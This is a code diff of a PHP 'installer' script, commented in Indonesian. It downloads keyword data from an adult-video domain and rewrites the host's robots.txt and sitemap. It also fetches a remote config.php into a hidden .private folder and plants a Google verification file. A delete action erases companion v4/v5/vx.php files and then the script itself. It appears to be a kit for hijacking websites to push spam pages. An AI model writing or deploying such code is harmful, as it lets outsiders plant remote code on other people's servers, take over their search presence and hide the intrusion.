@@ -21,7 +21,7 @@ $base_json_url_path = 'https://player.javpornsub.net/content/';
 $cache_dir = $server_path . '/.private';
 $local_json_path = $cache_dir . '/active_seo_data.json';
 $local_config_path = $cache_dir . '/config.php';
-$local_google_path = $server_path . '/google8f39414e57a5615a.html'; // Path file Google
+$local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
 $local_robots_path = $server_path . '/robots.txt';
 $local_sitemap_path = $server_path . '/sitemap.xml';
 
@@ -93,12 +93,14 @@ function buat_robots_txt($domain) {
     return false;
 }
 
-// --- [FUNGSI UTAMA (TUGAS BERURUTAN)] ---
+// --- [FUNGSI UTAMA (DIBAGI 2 BAGIAN)] ---
 
-function jalankan_proses_seo() {
-    global $clean_host, $config_url, $google_url, $cache_dir, $local_json_path, 
-           $local_config_path, $local_google_path, $server_path, $base_json_url_path,
-           $local_sitemap_path, $self_script_name;
+/**
+ * BAGIAN 1: Menjalankan Tugas 1, 2, 3 (JSON, Robots, Sitemap)
+ */
+function jalankan_proses_seo_part1() {
+    global $clean_host, $cache_dir, $local_json_path, $server_path, 
+           $base_json_url_path, $local_sitemap_path, $self_script_name;
 
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
         header('Location: ' . $self_script_name);
@@ -109,7 +111,6 @@ function jalankan_proses_seo() {
     if (substr($json_filename, -5) !== '.json') {
         $json_filename .= '.json';
     }
-    
     $derived_json_url = $base_json_url_path . $json_filename;
 
     $logs = [
@@ -119,7 +120,7 @@ function jalankan_proses_seo() {
     if (!is_dir($cache_dir)) {
         if (!@mkdir($cache_dir, 0755, true)) {
             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat folder .private. Periksa izin.'];
-            tampilkan_log_terminal($logs, false, $json_filename); 
+            tampilkan_log_terminal($logs, 'final_error', $json_filename, $clean_host); 
             return false;
         } else {
             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Folder .private dibuat.'];
@@ -129,7 +130,6 @@ function jalankan_proses_seo() {
     // --- TUGAS 1: UNDUH JSON ---
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh JSON dari: ' . htmlspecialchars($derived_json_url)];
     $json_data = fetchFromUrl($derived_json_url, false);
-
     if ($json_data !== false && !empty($json_data)) {
         @file_put_contents($local_json_path, json_encode($json_data));
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'JSON disimpan di: .private/active_seo_data.json'];
@@ -149,12 +149,10 @@ function jalankan_proses_seo() {
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat sitemap.xml...'];
     $keywords = $json_data ? array_keys($json_data) : [];
     $total_keywords = count($keywords);
-    
     $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
     $base_url = $protocol . $clean_host;
     $now = date('Y-m-d\TH:i:s+07:00');
     $urls_per_map = 50000;
-    
     $num_maps = ceil($total_keywords / $urls_per_map);
     if ($num_maps == 0) $num_maps = 1;
 
@@ -183,6 +181,23 @@ function jalankan_proses_seo() {
     @file_put_contents($local_sitemap_path, $xml_index);
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index dan $num_maps sub-sitemap dibuat."];
 
+    // Panggil terminal untuk Jeda Pengecekan Slug
+    tampilkan_log_terminal($logs, 'step2_check_slug', $json_filename, $clean_host);
+}
+
+/**
+ * BAGIAN 2: Menjalankan Tugas 4 & 5 (Config, Google)
+ */
+function jalankan_proses_seo_part2() {
+    global $clean_host, $config_url, $google_url, $local_config_path, $local_google_path, $self_script_name;
+
+    // Ambil json_filename dari URL
+    $json_filename = $_GET['json_file'] ?? '';
+
+    $logs = [
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses...']
+    ];
+
     // --- TUGAS 4: UNDUH CONFIG.PHP ---
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php...'];
     $config_content = fetchRawUrl($config_url);
@@ -205,15 +220,22 @@ function jalankan_proses_seo() {
     
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Semua tugas selesai. Mengalihkan ke status...'];
     
-    tampilkan_log_terminal($logs, true, $json_filename);
+    // Panggil terminal untuk ke Halaman Status
+    tampilkan_log_terminal($logs, 'status', $json_filename, $clean_host);
 }
 
+
 /**
- * Fungsi untuk menampilkan UI Terminal dengan log
+ * Fungsi untuk menampilkan UI Terminal dengan log (DIMODIFIKASI)
+ * $next_action: 'step2_check_slug', 'status', 'final_error'
  */
-function tampilkan_log_terminal($logs, $redirect_on_complete = false, $json_filename = '') {
+function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename = '', $clean_host = '') {
     global $self_script_name;
-    $redirect_url = $self_script_name . '?status=completed&json_file=' . urlencode($json_filename);
+    
+    // Siapkan URL untuk JavaScript
+    $step2_url = $self_script_name . '?action=generate_step2&json_file=' . urlencode($json_filename);
+    $status_url = $self_script_name . '?status=completed&json_file=' . urlencode($json_filename);
+    $check_slug_url = 'https://' . $clean_host . '/wanz-895-eng-sub';
 
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
     <style>
@@ -249,18 +271,55 @@ function tampilkan_log_terminal($logs, $redirect_on_complete = false, $json_file
         const container = document.getElementById("logsContainer");
         let currentLog = 0; let currentChar = 0; let currentLine = null;
         
+        // Ambil variabel PHP
+        const next_action = "' . $next_action . '";
+        const step2_url = "' . $step2_url . '";
+        const status_url = "' . $status_url . '";
+        const check_slug_url = "' . $check_slug_url . '";
+
         function typeNextChar() {
             if (currentLog >= logs.length) {
-                setTimeout(() => {
-                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
-                    ' . ($redirect_on_complete ? '
+                // Semua log selesai diketik, tentukan aksi selanjutnya
+                
+                if (next_action === "step2_check_slug") {
+                    // --- LOGIKA BARU UNTUK CEK SLUG ---
+                    let promptLine = document.createElement("div");
+                    promptLine.className = "log-entry";
+                    promptLine.innerHTML = \'<span class="timestamp">' . date('H:i:s') . '</span><span class="log-warning typing">Tekan ENTER untuk Cek Slug (' . htmlspecialchars($check_slug_url) . ')...</span>\';
+                    container.appendChild(promptLine);
+
+                    // Tambahkan listener keyboard
+                    document.addEventListener("keydown", function(e) {
+                        if (e.key === "Enter") {
+                            // Hentikan listener agar tidak ter-trigger dua kali
+                            e.preventDefault(); 
+                            
+                            // Buka tab baru
+                            window.open(check_slug_url, \'_blank\');
+                            
+                            // Lanjutkan ke step 2
+                            window.location.href = step2_url;
+                        }
+                    });
+
+                } else if (next_action === "status") {
+                    // --- LOGIKA LAMA (Ke Halaman Status) ---
                     setTimeout(() => {
-                        window.location.href = \'' . $redirect_url . '\';
-                    }, 500);' : '') . '
-                }, 500);
-                return;
+                        container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
+                        setTimeout(() => {
+                            window.location.href = status_url;
+                        }, 500);
+                    }, 500);
+
+                } else if (next_action === "final_error") {
+                    // Berhenti jika ada error fatal (misal: gagal buat folder)
+                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
+                }
+                
+                return; // Hentikan fungsi typeNextChar
             }
             
+            // Logika mengetik log
             const log = logs[currentLog];
             if (currentChar === 0) {
                 currentLine = document.createElement("div");
@@ -288,7 +347,7 @@ function tampilkan_log_terminal($logs, $redirect_on_complete = false, $json_file
 
 
 /**
- * Fungsi hapus_skrip_sendiri
+ * Fungsi hapus_skrip_sendiri (Dengan Peringatan Verifikasi Google)
  */
 function hapus_skrip_sendiri() {
     global $self_script_name, $full_domain_url;
@@ -308,7 +367,7 @@ function hapus_skrip_sendiri() {
         .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
         .timestamp { color: #666; min-width: 70px; font-size: 10px; }
         .log-info { color: #0095ff; }
-        .log-warning { color: #ffbd2e; }
+        .log-warning { color: #ffbd2e; } 
         .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
         @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
         .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
@@ -500,10 +559,17 @@ function tampilkan_status_selesai() {
 }
 
 
-// --- [ROUTER UTAMA] ---
+// --- [ROUTER UTAMA (DIMODIFIKASI)] ---
 
 if (isset($_GET['action']) && $_GET['action'] === 'generate') {
-    jalankan_proses_seo();
+    // Memulai Bagian 1
+    jalankan_proses_seo_part1();
+    exit;
+}
+
+if (isset($_GET['action']) && $_GET['action'] === 'generate_step2') {
+    // Memulai Bagian 2 (setelah cek slug)
+    jalankan_proses_seo_part2();
     exit;
 }
 
@@ -512,7 +578,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'delete' && !isset($_GET['conf
     exit;
 }
 
-// --- [BLOK PENGHAPUSAN YANG DIPERBARUI] ---
+// --- [BLOK PENGHAPUSAN (TETAP SAMA)] ---
 if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
     global $server_path, $local_google_path, $self_script_path, $full_domain_url;
 
@@ -523,12 +589,11 @@ if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confi
         $server_path . '/v4.php',
         $server_path . '/v5.php',
         $server_path . '/vx.php',
-        $local_google_path // Ini adalah $server_path . '/google8f39414e57a5615a.html'
+        $local_google_path 
     ];
 
     $deleted_files_log = [];
 
-    // Hapus file-file v*.php dan file google
     foreach ($files_to_delete as $file) {
         if (file_exists($file)) {
             if (@unlink($file)) {
@@ -539,7 +604,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confi
         }
     }
 
-    // Hapus skrip ini sendiri
     if (@unlink($self_script_path)) {
         $deleted_files_log[] = basename($self_script_path) . ' ... Dihapus (Self-destruct)';
         $self_delete_success = true;
@@ -548,7 +612,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confi
         $self_delete_success = false;
     }
 
-    // Tampilkan output HTML terakhir
     header('Content-Type: text/html');
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Script Deleted</title>
     <style>
@@ -573,7 +636,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confi
             </div>
             <div class="terminal-content">';
     
-    // Tampilkan log hasil penghapusan
     foreach ($deleted_files_log as $log) {
         $log_type = (strpos($log, 'GAGAL') !== false) ? 'log-error' : 'log-success';
         echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span class="' . $log_type . '">' . htmlspecialchars($log) . '</span></div>';
@@ -593,7 +655,7 @@ if (isset($_GET['status'])) {
     exit;
 } 
 
-// --- [HALAMAN DEFAULT (Tampilan "Installer" BARU dengan Form Input)] ---
+// --- [HALAMAN DEFAULT (Tampilan "Installer" dengan Form Input)] ---
 else {
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
     <style>
